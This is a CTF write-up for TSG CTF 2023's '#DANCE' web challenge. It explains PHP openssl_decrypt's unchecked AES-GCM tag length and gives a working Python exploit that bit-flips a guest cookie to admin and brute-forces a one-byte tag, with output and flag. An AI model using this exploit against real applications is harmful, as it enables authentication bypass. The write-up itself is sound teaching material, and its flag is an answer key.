# TSG CTF 2023 - web/#DANCE

- 17 solves / 221 pts
- Author: jiei_univ

`openssl_decrypt`:

> **Caution** The length of the tag is not checked by the function. It is the caller's responsibility to ensure that the length of the tag matches the length of the tag retrieved when openssl_encrypt() has been called. Otherwise the decryption may succeed if the given tag only matches the start of the proper tag.
>
> https://www.php.net/manual/en/function.openssl-decrypt.php

This challenge does not check the length of the tag in AES-GCM.

You can do a brute-force attack:

- FYI (Japanese): https://www.mbsd.jp/research/20200901/aes-gcm/

## Exploit

```python
import httpx
import base64
import urllib.parse

# BASE_URL = "http://localhost:8080"
BASE_URL = "http://34.84.176.251:8080"

res = httpx.post(
    BASE_URL,
    data={
        "auth": "guest",
    },
)
assert res.status_code == 302

guest_auth = urllib.parse.unquote(res.cookies["auth"])
iv = urllib.parse.unquote(res.cookies["iv"])
tag = urllib.parse.unquote(res.cookies["tag"])


def xor(xs: bytes, ys: bytes) -> bytes:
    return bytes([x ^ y for x, y in zip(xs, ys)])


admin_auth = base64.b64encode(
    xor(base64.b64decode(guest_auth), xor(b"guest", b"admin"))
).decode()

for i in range(256):
    tag2 = base64.b64encode(bytes([i])).decode()
    res = httpx.get(
        f"{BASE_URL}/mypage.php",
        cookies={
            "auth": admin_auth,
            "iv": iv,
            "tag": tag2,
        },
    )
    if "TSGCTF{" in res.text:
        print(res.text)
        break
```

```html
$ python exploit.py
<!DOCTYPE html>
<html>
    <head>

    </head>
    <body>
        Hello admin! Password is here.
TSGCTF{Deadlock_has_been_broken_with_Authentication_bypass!_Now,_repair_website_to_reject_rewritten_CookiE.}
        </body>
</html>
```

## Flag

```
TSGCTF{Deadlock_has_been_broken_with_Authentication_bypass!_Now,_repair_website_to_reject_rewritten_CookiE.}
```
